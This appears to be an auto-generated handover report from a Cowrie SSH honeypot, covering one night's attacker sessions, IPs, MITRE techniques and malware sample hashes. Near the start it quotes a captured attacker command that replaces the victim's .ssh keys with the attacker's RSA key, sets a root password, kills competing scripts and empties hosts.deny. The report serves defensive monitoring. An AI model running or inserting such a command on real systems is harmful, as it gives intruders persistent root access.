| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:WxYKmTLfNObZ"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-27 22:15:20` | `cowrie.session.connect` |
| `2026-03-27 22:15:20` | `cowrie.client.version` |
| `2026-03-27 22:15:20` | `cowrie.client.kex` |
| `2026-03-27 22:15:20` | `cowrie.login.success` |
| `2026-03-27 22:15:21` | `cowrie.session.params` |
| `2026-03-27 22:15:21` | `cowrie.command.input` |
| `2026-03-27 22:15:21` | `cowrie.command.failed` |
| `2026-03-27 22:15:21` | `cowrie.log.closed` |
| `2026-03-27 22:15:21` | `cowrie.session.params` |
| `2026-03-27 22:15:21` | `cowrie.command.input` |
| `2026-03-27 22:15:22` | `cowrie.session.file_download` |
| `2026-03-27 22:15:22` | `cowrie.log.closed` |
| `2026-03-27 22:15:38` | `cowrie.session.params` |
| `2026-03-27 22:15:38` | `cowrie.command.input` |
| `2026-03-27 22:15:38` | `cowrie.log.closed` |
| `2026-03-27 22:15:39` | `cowrie.session.params` |
| `2026-03-27 22:15:39` | `cowrie.command.input` |
| `2026-03-27 22:15:39` | `cowrie.log.closed` |
| `2026-03-27 22:15:39` | `cowrie.session.params` |
| `2026-03-27 22:15:39` | `cowrie.command.input` |
| `2026-03-27 22:15:39` | `cowrie.session.file_download` |
| `2026-03-27 22:15:39` | `cowrie.log.closed` |
| `2026-03-27 22:15:40` | `cowrie.session.params` |
| `2026-03-27 22:15:40` | `cowrie.command.input` |
| `2026-03-27 22:15:40` | `cowrie.log.closed` |
| `2026-03-27 22:15:40` | `cowrie.session.params` |
| `2026-03-27 22:15:40` | `cowrie.command.input` |
| `2026-03-27 22:15:40` | `cowrie.log.closed` |
| `2026-03-27 22:15:41` | `cowrie.session.params` |
| `2026-03-27 22:15:41` | `cowrie.command.input` |
| `2026-03-27 22:15:41` | `cowrie.command.input` |
| `2026-03-27 22:15:42` | `cowrie.log.closed` |
| `2026-03-27 22:15:42` | `cowrie.session.params` |
| `2026-03-27 22:15:42` | `cowrie.command.input` |
| `2026-03-27 22:15:42` | `cowrie.log.closed` |
| `2026-03-27 22:15:42` | `cowrie.session.params` |
| `2026-03-27 22:15:42` | `cowrie.command.input` |
| `2026-03-27 22:15:43` | `cowrie.log.closed` |
| `2026-03-27 22:15:43` | `cowrie.session.params` |
| `2026-03-27 22:15:43` | `cowrie.command.input` |
| `2026-03-27 22:15:43` | `cowrie.log.closed` |
| `2026-03-27 22:15:43` | `cowrie.session.params` |
| `2026-03-27 22:15:43` | `cowrie.command.input` |
| `2026-03-27 22:15:43` | `cowrie.log.closed` |
| `2026-03-27 22:15:44` | `cowrie.session.params` |
| `2026-03-27 22:15:44` | `cowrie.command.input` |
| `2026-03-27 22:15:44` | `cowrie.log.closed` |
| `2026-03-27 22:15:44` | `cowrie.session.params` |
| `2026-03-27 22:15:44` | `cowrie.command.input` |
| `2026-03-27 22:15:44` | `cowrie.log.closed` |
| `2026-03-27 22:15:45` | `cowrie.session.params` |
| `2026-03-27 22:15:45` | `cowrie.command.input` |
| `2026-03-27 22:15:45` | `cowrie.log.closed` |
| `2026-03-27 22:15:45` | `cowrie.session.params` |
| `2026-03-27 22:15:45` | `cowrie.command.input` |
| `2026-03-27 22:15:45` | `cowrie.log.closed` |
| `2026-03-27 22:15:46` | `cowrie.session.params` |
| `2026-03-27 22:15:46` | `cowrie.command.input` |
| `2026-03-27 22:15:46` | `cowrie.log.closed` |
| `2026-03-27 22:15:46` | `cowrie.session.params` |
| `2026-03-27 22:15:46` | `cowrie.command.input` |
| `2026-03-27 22:15:47` | `cowrie.log.closed` |
| `2026-03-27 22:15:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.184.178[.]165` to AbuseIPDB if not already reported
- [ ] Block `180.184.178[.]165` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `102.212.40[.]244` | **15** | 2026-03-27 21:31 | 2026-03-27 21:34 | 3m | 0 | `T1592` | 🟠 MEDIUM |
| `101.126.24[.]58` | **2** | 2026-03-27 21:28 | 2026-03-27 21:31 | 4m | 0 | `T1592` | 🟢 LOW |
| `172.174.225[.]60` | **2** | 2026-03-27 20:37 | 2026-03-27 20:37 | 0m | 0 | `T1592` | 🟢 LOW |
| `180.184.178[.]165` | **2** | 2026-03-27 22:15 | 2026-03-27 22:17 | 4m | 0 | `T1592` | 🟢 LOW |
| `218.90.138[.]78` | **2** | 2026-03-27 20:46 | 2026-03-27 20:48 | 2m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `101.126.24[.]74` | 1 | 2026-03-27 22:28 | 2026-03-27 22:28 | 0s | 0 | `T1592` | 🟢 LOW |
| `112.161.26[.]125` | 1 | 2026-03-27 20:52 | 2026-03-27 20:52 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `112.27.129[.]78` | 1 | 2026-03-27 21:29 | 2026-03-27 21:29 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `119.152.102[.]54` | 1 | 2026-03-27 22:17 | 2026-03-27 22:17 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `121.66.124[.]146` | 1 | 2026-03-27 22:21 | 2026-03-27 22:21 | 4s | 0 | `T1592` | 🟢 LOW |
| `122.187.230[.]154` | 1 | 2026-03-27 20:59 | 2026-03-27 20:59 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `125.69.195[.]7` | 1 | 2026-03-27 21:19 | 2026-03-27 21:20 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `172.104.93[.]159` | 1 | 2026-03-27 21:19 | 2026-03-27 21:19 | 10s | 0 | `T1592` | 🟢 LOW |
| `188.59.178[.]29` | 1 | 2026-03-27 21:56 | 2026-03-27 21:56 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `220.246.66[.]209` | 1 | 2026-03-27 21:49 | 2026-03-27 21:49 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `24.142.170[.]231` | 1 | 2026-03-27 20:41 | 2026-03-27 20:41 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `37.142.173[.]63` | 1 | 2026-03-27 22:08 | 2026-03-27 22:10 | 120s | 0 | `T1592` | 🟢 LOW |
| `58.245.210[.]70` | 1 | 2026-03-27 22:28 | 2026-03-27 22:28 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `58.49.113[.]138` | 1 | 2026-03-27 20:41 | 2026-03-27 20:41 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (11 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 10/100 | 🟢 LOW | **26/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `188.59.178[.]29` | TR | TURKCELL INTERNET | **100** ⚠️ | 12 |
| `24.142.170[.]231` | US | Charter Communications Inc | **100** ⚠️ | 48 |
| `197.242.170[.]10` | MZ | IS - Internet Solutions Mozambique, Limitada | **100** ⚠️ | 50 |
| `112.27.129[.]78` | CN | China Mobile Communications Corporation | **100** ⚠️ | 50 |
| `210.4.68[.]73` | BD | BDCOM Online Limited, Internet Service Provider, Dhaka, Bangladesh | **100** ⚠️ | 50 |
| `101.126.24[.]58` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `117.242.191[.]29` | IN | Broadband Multiplay Project, O/o DGM BB, NOC BSNL | **100** ⚠️ | 3 |
| `218.90.138[.]78` | CN | wuxi sanyou netbar | **100** ⚠️ | 50 |
| `119.152.102[.]54` | PK | Pakistan Telecommunication Company Limited | **100** ⚠️ | 23 |
| `98.102.148[.]242` | US | VERENA AT HILLIARD | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 33 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 16 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 11 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 4 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 4 |

---

## 🔕 False Positive Summary (9 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 7 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 57 cases |
| Tool 34  | Credential Extractor        | ✅ 27 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 0 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 34 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 9 filtered (15.8%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 26 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 11 files |
| Tool 33  | YARA Classifier             | ✅ 4 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 11 priority case(s) shown individually · 19 recon entry/entries in table (5 group(s) consolidating 23 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-03-27T22:30:35Z_
